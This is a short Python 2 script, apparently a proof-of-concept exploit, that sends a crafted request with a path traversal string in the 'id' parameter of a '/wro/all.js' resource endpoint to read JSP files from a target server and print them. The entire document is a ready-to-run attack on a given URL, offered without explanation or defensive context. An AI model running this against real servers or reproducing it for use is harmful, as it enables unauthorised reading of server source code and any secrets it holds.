import sys, requests

URL = sys.argv[1].strip('/')

r = requests.get(URL + '/wro/all.js')
r = requests.get(URL + '/wro/all.js?wroAPI=wroResources&id=/asset/debug.js?/../../*.jsp')
print r.content